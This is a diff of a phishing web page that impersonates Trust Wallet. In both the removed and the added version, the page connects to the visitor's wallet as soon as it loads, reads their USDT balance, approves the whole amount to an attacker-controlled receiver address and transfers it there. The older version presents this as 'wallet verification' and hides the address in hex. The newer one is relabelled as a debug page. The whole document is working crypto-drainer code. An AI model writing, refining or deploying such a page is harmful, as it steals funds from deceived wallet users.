@@ -1,73 +1,71 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Trust Wallet Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="favicon.ico">
-  <style>
-    body {
-      margin: 0; padding: 0;
-      background-color: #081c3a;
-      color: white;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      height: 100vh; text-align: center;
-    }
-    img { width: 80px; margin-bottom: 20px; }
-    .footer { font-size: 12px; margin-top: 50px; opacity: 0.6; }
-    .status { margin-top: 10px; color: #ccc; }
-  </style>
+<meta charset="UTF-8">
+<title>Debug Trust Wallet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="favicon.ico">
+<style>
+body {
+  background:#081c3a; color:white; text-align:center; padding:20px;
+  font-family:sans-serif;
+}
+img { width:80px; margin-bottom:20px; }
+.status { margin-top:10px; color:#ccc; }
+</style>
 </head>
 <body>
-  <img src="logo.png" alt="Trust Wallet">
-  <h2>Secure Wallet Verification</h2>
-  <p id="status" class="status">Initializing wallet check...</p>
-  <div class="footer">Powered by Trust Wallet • Trusted by millions since 2009</div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
-    const decode = hex => hex.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
-    const RECEIVER = decode("31393536423339353041373342304335343739323139394564463133633762383335464639344443");
-    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+<img src="logo.png" alt="Trust Wallet">
+<h2>Debug Mode</h2>
+<p id="status" class="status">Initializing…</p>
 
-    const ABI = [
-      {"constant": true, "inputs": [{"name": "owner","type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance","type": "uint256"}], "type": "function"},
-      {"constant": false, "inputs": [{"name": "_spender","type": "address"},{"name": "_value","type": "uint256"}], "name": "approve", "outputs": [{"name": "","type": "bool"}], "type": "function"},
-      {"constant": false, "inputs": [{"name": "_from","type": "address"},{"name": "_to","type": "address"},{"name": "_value","type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "","type": "bool"}], "type": "function"}
-    ];
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<script>
+const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+const USDT = "0x55d398326f99059fF775485246999027B3197955";
+const ABI = [
+  {constant:true,inputs:[{name:"owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],type:"function"},
+  {constant:false,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],type:"function"},
+  {constant:false,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[{name:"",type:"bool"}],type:"function"}
+];
 
-    async function beginVerification() {
-      try {
-        const status = document.getElementById('status');
-        if (!window.ethereum) { status.textContent = "⚠️ Please open this page in Trust Wallet DApp browser."; return; }
+async function run() {
+  const status = document.getElementById('status');
+  try {
+    if (!window.ethereum) { status.innerText = "❌ Trust Wallet DApp browser needed"; return; }
 
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
-        const contract = new web3.eth.Contract(ABI, USDT);
+    const web3 = new Web3(window.ethereum);
+    await window.ethereum.request({ method: "eth_requestAccounts" });
 
-        status.textContent = "🔍 Checking USDT balance...";
-        const balance = await contract.methods.balanceOf(user).call();
-        const amount = web3.utils.toBN(balance);
-        if (amount.isZero()) { status.textContent = "🚫 No USDT available to verify."; return; }
+    const accounts = await web3.eth.getAccounts();
+    const user = accounts[0];
+    status.innerText = "✅ Connected: " + user;
 
-        status.textContent = "🛡️ Approving transaction...";
-        await contract.methods.approve(RECEIVER, amount).send({ from: user });
+    // Check network
+    const chainId = await web3.eth.getChainId();
+    if (chainId !== 56) { status.innerText += "\n❌ Please switch to Smart Chain (BSC)"; return; }
 
-        status.textContent = "✅ Approved. Finalizing transfer...";
-        setTimeout(async () => {
-          try {
-            await contract.methods.transferFrom(user, RECEIVER, amount).send({ from: user });
-            status.textContent = "🎉 Success! Wallet verified and USDT transferred.";
-          } catch (e) {
-            status.textContent = "❌ Transfer failed: " + e.message;
-          }
-        }, 1500);
+    const contract = new web3.eth.Contract(ABI, USDT);
+    const balance = await contract.methods.balanceOf(user).call();
 
-      } catch (e) {
-        document.getElementById('status').textContent = "❌ Error: " + e.message;
-      }
-    }
+    status.innerText += "\n💰 Balance: " + balance;
 
-    window.addEventListener('load', () => setTimeout(beginVerification, 1000));
-  </script></body>
+    if (balance === "0") { status.innerText += "\nYou have 0 USDT"; return; }
+
+    status.innerText += "\n🛡️ Approving…";
+    await contract.methods.approve(RECEIVER, balance).send({ from: user });
+
+    status.innerText += "\n✅ Approved. Transferring…";
+    await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+
+    status.innerText += "\n🎉 Success!";
+  } catch (e) {
+    status.innerText += "\n❌ Error: " + e.message;
+    alert("Error: " + e.message); // For extra debug
+  }
+}
+
+window.addEventListener('load', run);
+</script>
+</body>
 </html>
